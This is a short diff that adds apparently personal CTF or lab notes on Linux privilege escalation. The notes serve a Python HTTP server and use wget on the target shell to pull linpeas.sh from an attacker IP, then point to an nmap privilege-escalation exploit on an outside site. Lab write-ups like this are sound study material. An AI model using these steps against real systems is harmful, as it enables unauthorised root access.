@@ -1,0 +1,12 @@
+Install linpeas
+
+Open a simple python server
+python -m http.server
+
+On shell
+wget http://10.11.12.65:8000/linpeas.sh
+
+Found nmap is highly vulnerable
+
+Follow Exploit 2 on the site below
+https://vk9-sec.com/nmap-privilege-escalation/
